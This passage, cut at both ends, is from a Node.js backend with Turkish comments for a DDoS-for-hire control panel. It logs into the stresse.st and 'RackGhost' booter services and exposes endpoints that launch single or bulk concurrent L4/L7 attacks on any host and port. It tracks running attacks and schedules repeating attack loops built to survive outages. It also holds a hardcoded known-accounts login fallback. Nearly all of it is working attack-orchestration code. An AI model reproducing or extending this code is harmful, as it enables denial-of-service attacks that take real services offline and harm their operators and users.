    // bilinen hesaplar listesinde dogru sifreyle geliyorsa, API key ile
    // dogrudan oturum acmayi dene.
    if (KNOWN_ACCOUNTS.get(username) === password) {
      try {
        return await performKeyBasedLogin(sessionId, username);
      } catch (keyErr) {
        console.warn(`[login] key-bazli giris de basarisiz: ${keyErr.message}`);
      }
    }
    // Basarisiz login durumunda olusturulan gecici session'i temizle
    delete sessions[sessionId];
    saveState();
    stepErr.step = step;
    throw stepErr;
  }
}

/**
 * POST /api/stresse/login
 * Body: { username, password }
 */
app.post('/api/stresse/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    if (!username || !password) {
      return res.status(400).json({ status: 'error', message: 'Username and password required' });
    }

    const sessionId = `sess_${Date.now()}_${crypto.randomBytes(12).toString('base64url')}`;
    try {
      const { user, plan } = await performStresseLogin(sessionId, username, password);
      res.json({
        status: 'success',
        sessionId,
        user,
        plan
      });
    } catch (stepErr) {
      if (stepErr.statusCode === 401) {
        return res.status(401).json({ status: 'error', message: 'Invalid credentials' });
      }
      // Hangi adimda patladigini ve stresse.st'in dondugu govdeyi acikca gorelim
      const status = stepErr.response?.status;
      const body = stepErr.response?.data;
      console.error(`Login error @ ${stepErr.step}: ${stepErr.message}`);
      console.error(`  upstream status: ${status}`);
      console.error(`  upstream body:`, typeof body === 'string' ? body.slice(0, 500) : JSON.stringify(body)?.slice(0, 500));
      return res.status(502).json({
        status: 'error',
        message: `stresse.st ${stepErr.step} -> ${status || 'no-response'}: ${stepErr.message}`,
        upstreamStatus: status,
        upstreamBody: typeof body === 'string' ? body.slice(0, 300) : body
      });
    }
  } catch (error) {
    console.error('Login error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/stresse/user/:username
 */
app.get('/api/stresse/user/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    const response = await client.get(`/user/${req.params.username}`);
    res.json(response.data);
  } catch (error) {
    handleEndpointError(res, error, 'User fetch error');
  }
});

/**
 * GET /api/stresse/plan/:username
 */
app.get('/api/stresse/plan/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { username } = req.params;
    const client = getClient(sessionId);
    try {
      const response = await fetchWithRetry(() => client.get(`/plan/${username}`), `plan/${username}`);
      planCache.set(username, { data: response.data, fetchedAt: Date.now() });
      return res.json(response.data);
    } catch (err) {
      // Upstream iki denemede de basarisiz: cache varsa (taze veya bayat) onu dondur.
      const cached = planCache.get(username);
      if (cached) {
        const stale = Date.now() - cached.fetchedAt > PLAN_CACHE_TTL_MS;
        console.warn(`[cache] plan bayat veri servis edildi (username=${username}, yas=${Math.round((Date.now() - cached.fetchedAt) / 1000)}sn, ttlAsimi=${stale})`);
        return res.json(cached.data);
      }
      throw err;
    }
  } catch (error) {
    handleEndpointError(res, error, 'Plan fetch error');
  }
});

/**
 * GET /api/stresse/methods
 */
app.get('/api/stresse/methods', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const client = getClient(sessionId);
    try {
      const response = await fetchWithRetry(() => client.get('/methods.json'), 'methods');
      // Upstream anti-bot challenge sayfasi (HTML) dondurebilir; bunu cache'leme/
      // servis etme yoksa frontend'e string gider ve panel coker (siyah ekran).
      if (!Array.isArray(response.data) || !response.data.every((m) => m && typeof m === 'object' && m.method)) {
        throw new Error('stresse.st methods beklenmeyen formatta (anti-bot sayfasi?)');
      }
      methodsCache.data = response.data;
      methodsCache.fetchedAt = Date.now();
      return res.json(response.data);
    } catch (err) {
      // Upstream iki denemede de basarisiz: cache varsa (taze veya bayat) onu dondur.
      if (methodsCache.data) {
        const stale = Date.now() - methodsCache.fetchedAt > METHODS_CACHE_TTL_MS;
        console.warn(`[cache] methods bayat veri servis edildi (yas=${Math.round((Date.now() - methodsCache.fetchedAt) / 1000)}sn, ttlAsimi=${stale})`);
        return res.json(methodsCache.data);
      }
      throw err;
    }
  } catch (error) {
    handleEndpointError(res, error, 'Methods fetch error');
  }
});

/**
 * GET /api/stresse/ongoing/:username
 *
 * stresse.st'ten gelen gercek ongoing listesine, backend restart sonrasi
 * hatirladigimiz attack ID'lerini de ekler. Boylece normal saldirilar da
 * restart sonrasi panelde gorunmeye devam eder.
 */
app.get('/api/stresse/ongoing/:username', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { username } = req.params;
    const client = getClient(sessionId);
    const response = await client.get(`/ongoing/${username}`);

    let ongoing = [];
    if (Array.isArray(response.data)) {
      ongoing = response.data;
    } else if (response.data && Array.isArray(response.data.attacks)) {
      ongoing = response.data.attacks;
    }

    const existingIds = new Set(ongoing.map((a) => a.attack_id || a.id));
    const now = Date.now();

    // stresse.st'te hala gecerli olan saldirilarin local expiresAt degerini uzat.
    // Boylece cleanup erken silmez ve liste azalip artmaz.
    ongoing.forEach((item) => {
      const id = item.attack_id || item.id;
      // Loop/launch notu: ID dogrulamasindan bagimsiz, satirla ayni anda gelir
      item.note = resolveNoteForRow(username, item.target || item.host, item.method);
      const localAttack = activeAttacks[id];
      if (!localAttack) return;
      // Grup goruntusu: loopId ve group satira tasinir
      if (localAttack.loopId) item.loopId = localAttack.loopId;
      if (localAttack.group) item.group = localAttack.group;
      // Sadece gercek kalan sure ile uzat. item.time (tam sure) veya || 60
      // fallback'i expiresAt'i her poll'da ileri itip kaydi olumsuzlastiriyordu
      // (hayalet birikim). timeLeft yoksa/0 ise uzatma YOK; kayit dogal
      // sureciyle biter.
      // Upstream L4'te timeLeft'e kuyruk/bekleme payi katabilir (60s'lik
      // saldiri 85s gosterir). Kaydaki gercek sureyi asma.
      const configuredTime = parseInt(localAttack.time, 10) || 0;
      const rawLeft = parseInt(item.timeLeft, 10);
      if (Number.isFinite(rawLeft) && configuredTime > 0 && rawLeft > configuredTime) {
        item.timeLeft = configuredTime;
      }
      const upstreamLeft = parseInt(item.timeLeft, 10);
      if (Number.isFinite(upstreamLeft) && upstreamLeft > 0) {
        // Upstream bazen gercek surenin ustunde timeLeft dondurur (kuyruk/
        // yeniden sayma): kaydin kendi suresinin uzerine CIKMA. Toleranssiz —
        // aksi halde sisik upstream degeri expiresAt'e yazilir ve kalici
        // satir 60s'lik saldiriyi 81s gibi gosterir.
        const maxLeft = parseInt(localAttack.time, 10) || 0;
        // time'i bilinmeyen kayitlari UZATMA: clampsuz uzatma kaydi
        // olumsuzlestiriyordu (cleanup dokunamaz, hayalet satir).
        if (maxLeft <= 0) return;
        const clampedLeft = Math.min(upstreamLeft, maxLeft);
        const newExpires = new Date(now + clampedLeft * 1000).toISOString();
        if (newExpires > (localAttack.expiresAt || '')) {
          localAttack.expiresAt = newExpires;
        }
      }
    });

    // Upstream'in attack_id'siz (null) satirlari ID tekillestirmesinden kacar;
    // ayni fiziksel saldiri hem upstream hem kayit defteri satiri olarak IKI KEZ
    // sayilmamasin diye hedef+yontem bazinda butcele: her null-id'li upstream
    // satiri, ayni imzali bir kayit defteri satirini "yer".
    const nullIdBudget = new Map();
    ongoing.forEach((item) => {
      if (item.attack_id || item.id) return;
      const sig = rowSigKey(item.target || item.host, item.method);
      if (sig) nullIdBudget.set(sig, (nullIdBudget.get(sig) || 0) + 1);
    });

    Object.values(activeAttacks).forEach((attack) => {
      // Sadece ayni session'a ait saldirilari ekle (diger kullanicilarin saldirilarini karistirma)
      if (attack.sessionId !== sessionId) return;
      // Sadece ayni kullaniciya ait saldirilari ekle
      if (attack.username && attack.username !== username) return;
      // Zaten listede varsa tekrar ekleme
      if (existingIds.has(attack.attackId)) return;
      // Upstream ayni saldiriyi id'siz satirla zaten gosteriyorsa ekleme
      const sig = rowSigKey(buildTargetUrl(attack.host, attack.port), attack.method);
      if (sig && (nullIdBudget.get(sig) || 0) > 0) {
        nullIdBudget.set(sig, nullIdBudget.get(sig) - 1);
        return;
      }

      const expires = new Date(attack.expiresAt || 0).getTime();
      const timeLeft = Math.max(0, Math.round((expires - now) / 1000));
      if (timeLeft <= 0) return; // Suresi dolmussa ekleme

      ongoing.push({
        attack_id: attack.attackId,
        id: attack.attackId,
        // SSE'deki taze-kayit bloguyla ayni format: L7 "https://host/:443".
        // Aksi halde poll'da gelen satir upstream "https://host/:443" ile
        // eslesmeyip ayni saldiriyi ikinci satir olarak gosteriyordu.
        target: attack.layer === 'L7'
          ? `https://${attack.host}/:${attack.port}`
          : buildTargetUrl(attack.host, attack.port),
        host: attack.host,
        port: attack.port,
        method: attack.method,
        layer: attack.layer || 'L4',
        timeLeft,
        note: resolveNoteForRow(username, attack.host, attack.method),
        // Frontend'in diger alanlarini doldur
        time: attack.time,
        startedAt: attack.startedAt,
        expiresAt: attack.expiresAt,
        // stresse.st'den gelen gercek deger degil, "persisted" isareti
        persisted: true
      });
    });

    // RackGhost satirlari: SSE ile ayni gorunum. SSE sessizken poll'a dusen
    // frontend RG saldirilarini kaybetmesin (hesap filtreli).
    if (rackghost.isConfigured()) {
      const rgVisibleRow = makeRgVisibility();
      try {
        const rgList = await rackghost.getOngoing();
        rgList.forEach((a) => {
          const created = a.created_at ? Date.parse(String(a.created_at).replace(' ', 'T')) : NaN;
          const dur = parseInt(a.time, 10) || 0;
          const tl = Number.isFinite(created) ? Math.max(0, Math.round((created + dur * 1000 - now) / 1000)) : dur;
          const rgHost = String(a.host || '').replace(/\/+$/, '');
          const row = {
            attack_id: `rg_${a.id}`,
            target: `${rgHost}:${a.port}`,
            method: a.method,
            timeLeft: String(tl),
            count: parseInt(a.slots, 10) || 1,
            layer: a.layer === 7 ? 'L7' : 'L4',
            provider: 'rackghost'
          };
          if (rgVisibleRow(row, username)) ongoing.push(row);
        });
      } catch { /* RG merge hatasi: taze kayitlar asagida yine eklenir */ }
      // Taze kayitlar (stresse id'leri zaten dedupe'li; rg pending dahil)
      appendFreshRegistryRows(ongoing, username);
    }

    res.json(ongoing);
  } catch (error) {
    handleEndpointError(res, error, 'Ongoing fetch error');
  }
});

/**
 * POST /api/stresse/attack
 */
app.post('/api/stresse/attack', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { port, time, method, subnet = '32', geo = 'worldwide', layer = 'L4' } = req.body;
    const note = sanitizeNote(req.body.note);
    const rawHost = req.body.host;
    if (layer === 'L4' && /https?:\/\/|\//.test(rawHost || '')) {
      return res.status(400).json({ status: 'error', message: 'L4 hedefinde URL protokolu veya / kullanilamaz' });
    }
    // L7'de path/query korunur (cache-bypass); L4'te bare host.
    const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${method})` });
    }

    const planCheck = checkPlanLimits(sessionId, time, 1);
    if (!planCheck.ok) {
      return res.status(403).json({ status: 'error', message: planCheck.message });
    }

    const session = sessions[sessionId];
    if (!session || !session.apiToken) {
      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
    }

    let data, attackIds;
    try {
      const result = await launchAttacksGet(sessionId, {
        host, port: parseInt(port), time: parseInt(time), method, layer, geo, subnet,
        // Aninda kayit pending/id'li satirin grup rozetiyle dusmesi icin
        group: resolveGroupName(req.body.group, sessions[sessionId]?.username) || undefined
      }, 1);
      data = result.data;
      attackIds = result.attackIds;
    } catch (err) {
      return res.status(502).json({ status: 'error', message: normalizeUpstreamError(err.message) });
    }

    if (attackIds.length > 0) {
      attackIds.forEach((attackId) => {
        registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time, layer, group: resolveGroupName(req.body.group, sessions[sessionId]?.username) || undefined });
      });
      addAttackHistory(sessionId, { host, port, method, time, layer, note }, {
        concurrents: 1,
        attackIds
      });
    } else if (data?.status === 'success') {
      // stresse.st success dondu ama ID cikaramadik; saldiri kayitsiz kalir.
      console.warn(`[attack] stresse.st success dondu ama attackId bulunamadi: host=${host} method=${method}`);
    }

    res.json({
      status: attackIds.length > 0 ? 'success' : 'error',
      // Upstream'in sebebini (orn. method bakimda) kullanici gorebilsin
      message: attackIds.length > 0 ? undefined : (data?.message || 'Saldiri upstream tarafindan baslatilamadi'),
      data,
      attackIds,
      id: attackIds[0] || null,
      attack_id: attackIds[0] || null
    });
  } catch (error) {
    handleEndpointError(res, error, 'Attack error');
  }
});

/**
 * POST /api/stresse/attack/bulk
 * Body: { host, port, time, method, subnet, geo, concurrents, layer }
 *
 * API key ile tek istekte concurrents kadar saldiri baslatir.
 */
app.post('/api/stresse/attack/bulk', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { port, time, method, subnet = '32', geo = 'worldwide', layer = 'L4', concurrents = 1 } = req.body;
    const note = sanitizeNote(req.body.note);
    const rawHost = req.body.host;
    const provider = req.body.provider === 'rackghost' ? 'rackghost' : 'stresse';

    // --- RackGhost provider: stresse akisindan tamamen ayri ---
    if (provider === 'rackghost') {
      const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
      if (!host || !port || !time || !method) {
        return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
      }
      const count = Math.max(1, parseInt(concurrents) || 1);
      if (count > rackghost.LIMITS.maxConcurrents) {
        return res.status(400).json({ status: 'error', message: `RackGhost maksimum concurrent ${rackghost.LIMITS.maxConcurrents}` });
      }
      if (parseInt(time) > rackghost.LIMITS.maxTime) {
        return res.status(400).json({ status: 'error', message: `RackGhost maksimum süre ${rackghost.LIMITS.maxTime} saniye` });
      }
      try {
        const result = await rackghost.startAttack({ host, port: parseInt(port), time: parseInt(time), concurrents: count, method });
        result.attackIds.forEach((attackId) => {
          const slots = (result.raw || []).find((it) => String(it.id) === String(attackId));
          registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time, layer, provider: 'rackghost', group: resolveGroupName(req.body.group, sessions[sessionId]?.username) || undefined }, null, parseInt(slots?.slots, 10) || 1);
        });
        addAttackHistory(sessionId, { host, port, method, time, layer, note }, { concurrents: count });
        // Frontend stresse cevap seklini bekler (successCount/failCount/total);
        // bunlar olmadan basarili saldiri hata gibi gosteriliyordu.
        return res.json({
          status: 'success',
          total: count,
          successCount: result.attackIds.length,
          failCount: count - result.attackIds.length,
          message: `${result.slotsTotal || result.attackIds.length} saldırı başlatıldı (RackGhost)`,
          attackIds: result.attackIds
        });
      } catch (err) {
        return res.status(err.sessionExpired ? 503 : 502).json({ status: 'error', message: `RackGhost: ${err.message}` });
      }
    }

    if (layer === 'L4' && /https?:\/\/|\//.test(rawHost || '')) {
      return res.status(400).json({ status: 'error', message: 'L4 hedefinde URL protokolu veya / kullanilamaz' });
    }
    // L7'de path/query korunur (cache-bypass); L4'te bare host.
    const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }

    if (isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${method})` });
    }

    const count = Math.max(1, parseInt(concurrents) || 1);

    const planCheck = checkPlanLimits(sessionId, time, count);
    if (!planCheck.ok) {
      return res.status(403).json({ status: 'error', message: planCheck.message });
    }

    const session = sessions[sessionId];
    if (!session || !session.apiToken) {
      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
    }

    // Tek istekte istenen concurrents kadar saldiri baslat.
    let data, attackIds;
    try {
      const result = await launchAttacksGet(sessionId, {
        host, port: parseInt(port), time: parseInt(time), method, layer, geo, subnet,
        // Aninda kayit pending/id'li satirin grup rozetiyle dusmesi icin
        group: resolveGroupName(req.body.group, sessions[sessionId]?.username) || undefined
      }, count);
      data = result.data;
      attackIds = result.attackIds;
    } catch (err) {
      return res.status(502).json({ status: 'error', message: normalizeUpstreamError(err.message) });
    }

    attackIds.forEach((attackId) => {
      registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time, layer, group: resolveGroupName(req.body.group, sessions[sessionId]?.username) || undefined });
    });

    const successCount = attackIds.length;

    if (attackIds.length > 0) {
      addAttackHistory(sessionId, { host, port, method, time, layer, note }, {
        concurrents: count,
        attackIds
      });
    }

    res.json({
      status: successCount > 0 ? 'success' : 'error',
      total: count,
      successCount,
      failCount: count - successCount,
      // ID dogrulanamadiysa kullanici gercek durumu gorsun; "basarili" denip
      // baslatilmamis saldiri gosterilmesin.
      message: successCount > 0
        ? (data?.message || '')
        : (data?.status === 'success'
            ? 'stresse.st basarili dondu ancak saldiri dogrulanamadi (method bakimda veya upstream reddi olabilir)'
            : (data?.message || 'Saldiri baslatilamadi')),
      data,
      id: attackIds[0] || null,
      attack_id: attackIds[0] || null,
      attackIds
    });
  } catch (error) {
    handleEndpointError(res, error, 'Bulk attack error');
  }
});

/**
 * POST /api/stresse/test-api
 * Body: { host, port, time, method, layer, concurrents, geo }
 *
 * stresse.st API'sine dogrudan bir istek atip ham yaniti doner.
 * Sistem calismadiginda debug icin kullanilir.
 */
app.post('/api/stresse/test-api', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const session = sessions[sessionId];
    if (!session || !session.apiToken) {
      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
    }

    const { port, time, method, geo = 'worldwide', layer = 'L4', concurrents = 1, apiToken: bodyToken } = req.body;
    const rawHost = req.body.host;
    // L7'de path/query korunur (cache-bypass); L4'te bare host.
    const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }

    const apiToken = (typeof bodyToken === 'string' && bodyToken.trim()) ? bodyToken.trim() : session.apiToken;
    const apiClient = getApiClient(sessionId);
    const url = buildApiUrl(apiToken, {
      host,
      port: parseInt(port),
      time: parseInt(time),
      method,
      geo,
      layer,
      concurrents: parseInt(concurrents)
    });

    let upstreamRes = null;
    let upstreamErr = null;
    try {
      upstreamRes = await apiClient.get(url, { timeout: 15000 });
    } catch (err) {
      upstreamErr = err;
    }

    // Guvenlik: debug yanitinda tam API token sizmasin; URL'deki key
    // parametresini maskele (ilk 8 karakter + '...'), tokenPrefix korunur.
    const maskedUrl = url.replace(/([?&]key=)[^&]*/, `$1${apiToken.slice(0, 8)}...`);

    res.json({
      status: 'debug',
      requestedUrl: maskedUrl,
      tokenSource: (typeof bodyToken === 'string' && bodyToken.trim()) ? 'body' : 'session',
      tokenPrefix: apiToken.slice(0, 8),
      upstreamStatus: upstreamRes?.status,
      upstreamData: upstreamRes?.data,
      upstreamError: upstreamErr ? {
        message: upstreamErr.message,
        status: upstreamErr.response?.status,
        data: upstreamErr.response?.data
      } : null
    });
  } catch (error) {
    handleEndpointError(res, error, 'Test API error');
  }
});

/**
 * Verilen loopId icin loop motorunu calistirir.
 * startLoop ve loadState() tarafindan kullanilir.
 */
// stresse kesintilerinde loop'lar olmesin diye yuksek tolerans; ustel backoff
// (30sn x hata, max 3dk) ile ~30 ardisik hata ~45-60dk kesintiye dayanir.
const MAX_LOOP_CONSECUTIVE_ERRORS = 30;

async function runLoop(loopId) {
  const loop = activeLoops[loopId];
  if (!loop || !loop.sessionId) {
    console.error(`[loop ${loopId}] Baslatilamadi: loop veya sessionId bulunamadi`);
    delete activeLoops[loopId];
    saveState();
    return;
  }

  // Loop'u global kuyruga ekle; scheduler sirasi geldiginde calistiracak.
  if (!loopQueue.includes(loopId)) {
    loopQueue.push(loopId);
    console.log(`[loop ${loopId}] kuyruga eklendi. Sira: ${loopQueue.length}`);
  }
  processLoopQueue().catch((err) => console.error('[scheduler] processLoopQueue beklenmeyen hata:', err));
}

async function processLoopQueue() {
  if (isProcessingLoopQueue) return;
  isProcessingLoopQueue = true;

  while (loopQueue.length > 0) {
    const loopId = loopQueue.shift();
    const loop = activeLoops[loopId];
    // Senkronlu loop'lar koordinatorun paylasilan saatiyle calisir; kuyruk
    // bunlara dokunmaz (senkron bozulunca bagimsiz kuyruka donerler).
    if (!loop || !loop.running || loop.syncGroup) continue;

    // Ayni loopId'den ayni anda sadece 1 tur calissin; aktif turu varsa bekle.
    // (Set'i fireLoopRound yonetir; burada sadece zamanlayici adaleti icin bakilir)
    if (activeLoopRounds.has(loopId)) {
      if (!loopQueue.includes(loopId)) {
        loopQueue.push(loopId);
      }
      await new Promise(r => setTimeout(r, 500));
      continue;
    }

    console.log(`[scheduler] ${loopId} turu baslatiliyor`);
    runLoopRound(loopId).finally(async () => {
      // Tur bittikten sonra loop hala calisiyorsa kendi intervali kadar bekle,
      // sonra kuyrugun sonuna ekle.
      if (activeLoops[loopId]?.running) {
        const delayMs = Math.max(0, parseInt(loop.params?.interval) || 0) * 1000;
        if (delayMs > 0) {
          console.log(`[scheduler] ${loopId} sonraki tur icin ${delayMs}ms bekleniyor`);
          await new Promise(r => setTimeout(r, delayMs));
        }
        if (!loopQueue.includes(loopId)) {
          loopQueue.push(loopId);
          console.log(`[loop ${loopId}] tur tamamlandi, kuyruga geri eklendi`);
        }
      } else {
        cleanupLoop(loopId);
      }
      // Scheduler'i tekrar calistir
      processLoopQueue().catch((err) => console.error('[scheduler] processLoopQueue beklenmeyen hata:', err));
    }).catch((err) => console.error('[scheduler] runLoopRound beklenmeyen hata:', err));
  }

  isProcessingLoopQueue = false;
}

// sinceMs verilirse sadece bu zamandan sonra baslamis saldirilar doner
// (timeout kurtarmasinda baska isteklerin saldirilarini kurtarmamak icin).
async function fetchOngoingAttackIds(sessionId, params, limit = 1, sinceMs = null) {
  try {
    const session = sessions[sessionId];
    if (!session?.username) return [];
    const webClient = getClient(sessionId);
    const ongoingRes = await webClient.get(`/ongoing/${session.username}`, { timeout: 15000 });
    const ongoingList = Array.isArray(ongoingRes.data)
      ? ongoingRes.data
      : (ongoingRes.data?.attacks || []);
    const now = Date.now();
    // Upstream tarih formati guvenilmez olabilir (epoch saniye string, saat
    // dilimi kaymasi vb.). Parse edilemeyen veya bariz kaymis tarihler eleme
    // sebebi olmasin; aksi halde calisan saldirilar "0 ID" gorunur.
    const parseStarted = (v) => {
      if (v === undefined || v === null || v === '') return null;
      if (typeof v === 'number') return v < 1e12 ? v * 1000 : v;
      const s = String(v).trim();
      if (/^\d+$/.test(s)) {
        const n = Number(s);
        return n < 1e12 ? n * 1000 : n;
      }
      const t = new Date(s).getTime();
      return Number.isNaN(t) ? null : t;
    };
    const isSaneDelta = (delta) => delta >= 0 && delta <= 24 * 60 * 60 * 1000;

    const matching = ongoingList.filter((a) => {
      const method = String(a.method || '').toLowerCase();
      const expectedMethod = String(params.method || '').toLowerCase();
      if (method !== expectedMethod) return false;
      // L4 hedef IP:port, L7 hedef host/:443 veya https://host/ formatinda gelir;
      // hepsini sade host'a indir (split sirasi onemli).
      let target = String(a.target || a.host || '');
      target = target.replace(/^https?:\/\//i, '');
      const hostPart = target.split('/')[0].split(':')[0];
      if (hostPart !== params.host) return false;

      const started = parseStarted(a.startedAt || a.start_time || a.started_at);
      if (started !== null) {
        const delta = now - started;
        // Zaman pencereleri sadece tarih makul (kaymamis) ise uygulanir;
        // kaymis/bozuk tarihte ID-diff ve kayit kontrolu zaten sahiplenmeyi korur.
        if (isSaneDelta(delta)) {
          if (sinceMs && started < sinceMs) return false;
          if (delta > 2 * 60 * 1000) return false;
        }
      }
      return true;
    });
    matching.sort((a, b) =>
      (parseStarted(b.startedAt || b.start_time || b.started_at) || 0) -
      (parseStarted(a.startedAt || a.start_time || a.started_at) || 0)
    );
    const ids = matching.slice(0, limit).map((a) => a.attack_id || a.id).filter(Boolean);
    console.log(`[fetchOngoingAttackIds] ${params.method}@${params.host} => ${ids.length} ID (toplam ${ongoingList.length})`);
    // Eslesme yoksa ornek kayitlari logla (alan adi/format teshisi); method+host
    // bazinda bir kez.
    if (ids.length === 0 && ongoingList.length > 0) {
      fetchOngoingAttackIds._debugLogged = fetchOngoingAttackIds._debugLogged || new Set();
      const debugKey = `${params.method}@${params.host}`;
      if (!fetchOngoingAttackIds._debugLogged.has(debugKey)) {
        fetchOngoingAttackIds._debugLogged.add(debugKey);
        const sample = ongoingList.slice(0, 3).map((a) => ({
          method: a.method,
          target: a.target || a.host,
          startedAt: a.startedAt ?? a.start_time ?? a.started_at,
          id: a.attack_id || a.id
        }));
        console.log(`[fetchOngoingAttackIds] DEBUG ${debugKey} ornekleri:`, JSON.stringify(sample).slice(0, 500));
      }
    }
    return ids;
  } catch (err) {
    console.warn('[fetchOngoingAttackIds] hata:', err.message);
    return [];
  }
}

// Tur atesleme cekirdegi: onceki tur beklemesi + launch + kayit + hata sayaci.
// runLoopRound (kendi saati) ve senkron koordinatoru (paylasilan saat) ortak kullanir.
// Donus: turda basarili saldiri sayisi (0 = tamamen basarisiz).
// Hesap basina paylasilan /ongoing onbellegi: eszamanli drain bekleyen
// duzinece loop ayni veriyi paylasir; aksi halde her loop kendi poll'unu
// acar ve stresse 429 (rate limit) ile karsilar. Anahtar username'dir —
// ayni hesabin farkli oturumlari ayni listeyi gorur.
const ongoingShared = new Map(); // username -> { at, list, inflight }
const ONGOING_SHARED_MS = 2000;
async function getOngoingShared(sessionId) {
  const session = sessions[sessionId];
  if (!session) return [];
  const key = session.username;
  const now = Date.now();
  const entry = ongoingShared.get(key) || { at: 0, list: [], inflight: null };
  ongoingShared.set(key, entry);
  if (entry.inflight) return entry.inflight;
  if (now - entry.at < ONGOING_SHARED_MS) return entry.list;
  entry.inflight = (async () => {
    try {
      const client = getClient(sessionId);
      const res = await client.get(`/ongoing/${key}`);
      entry.list = Array.isArray(res.data) ? res.data : (res.data?.attacks || []);
    } catch (err) {
      // Hata (429 dahil): bayat veriyi koru; 'at' guncellenir ki hemen
      // tekrar denenmesin — ONGOING_SHARED_MS kadar dogal backoff.
      console.warn(`[drain] /ongoing hatasi (${key}):`, err.message);
    } finally {
      entry.at = Date.now();
      entry.inflight = null;
    }
    return entry.list;
  })();
  return entry.inflight;
}

// Yeni tur oncesi onceki turun saldirilarinin upstream'den dustugunu bekler.
// Dogrulanmis loop'lar attack_id ile; ID'siz (dogrulanamayan tur) loop'lar
// hedef+yontem imzasinin /ongoing satir sayisi sifira inene kadar bekler —
// stresse attack_id dondurmediginde de calisir. Hesap basina tek poll yapilir
// (birden cok loop ayni hesaptaysa istekler birlesir). rackghost atlanir:
// saldirilari sure dolunca kesin olur, fireLoopRound'un statik buffer'i yeter.
async function waitLoopsDrained(loopIds, maxWaitMs = 60000) {
  const pending = new Map(); // loopId -> { kind:'ids'|'sig', ids:Set, sig, sessionId }
  for (const loopId of loopIds) {
    const loop = activeLoops[loopId];
    if (!loop || loop.params?.provider === 'rackghost') continue;
    if (!sessions[loop.sessionId]) continue;
    const ids = (loop.roundAttackIds || []).filter(Boolean);
    if (ids.length > 0) {
      pending.set(loopId, { kind: 'ids', ids: new Set(ids), sessionId: loop.sessionId });
    } else if ((loop.roundCount || 0) > 0) {
      const sig = rowSigKey(`${loop.params.host}:${loop.params.port}`, loop.params.method);
      if (sig) pending.set(loopId, { kind: 'sig', sig, sessionId: loop.sessionId });
    }
  }
  if (pending.size === 0) return;

  const started = Date.now();
  while (pending.size > 0 && Date.now() - started < maxWaitMs) {
    const bySession = new Map();
    pending.forEach((p, loopId) => {
      if (!bySession.has(p.sessionId)) bySession.set(p.sessionId, []);
      bySession.get(p.sessionId).push(loopId);
    });
    for (const [sessionId, sLoopIds] of bySession) {
      const session = sessions[sessionId];
      if (!session) { sLoopIds.forEach((id) => pending.delete(id)); continue; }
      const list = await getOngoingShared(sessionId);
      const ongoingIds = new Set(list.map((a) => a.attack_id || a.id));
      const sigCounts = new Map();
      list.forEach((a) => {
        const sig = rowSigKey(a.target || a.host, a.method);
        if (sig) sigCounts.set(sig, (sigCounts.get(sig) || 0) + 1);
      });
      sLoopIds.forEach((loopId) => {
        const p = pending.get(loopId);
        if (!p) return;
        if (p.kind === 'ids') {
          const alive = [...p.ids].filter((x) => ongoingIds.has(x));
          if (alive.length === 0) pending.delete(loopId);
          else p.ids = new Set(alive);
        } else if ((sigCounts.get(p.sig) || 0) === 0) {
          pending.delete(loopId);
        }
      });
    }
    if (pending.size > 0) await new Promise((r) => setTimeout(r, 1000));
  }
  if (pending.size > 0) {
    console.warn(`[drain] ${maxWaitMs}ms icinde dusmeyen loop'lar var, yine de devam: ${[...pending.keys()].join(', ')}`);
  }
}

async function fireLoopRound(loopId, { skipDrain = false } = {}) {
  const loop = activeLoops[loopId];
  if (!loop || !loop.running) return 0;

  // Reentrancy kilidi TEK NOKTADA: ayni loop'un iki turu ust uste binmesin.
  // Kuyruk (runLoopRound), senkron (syncTick) ve stopGroup->runLoop cakismasi
  // buradan gecer; sync.js'deki erken-atla kontrolu sadece log icindir.
  // Donus -1 = atlandi (hata sayacina GIRMEZ).
  if (activeLoopRounds.has(loopId)) {
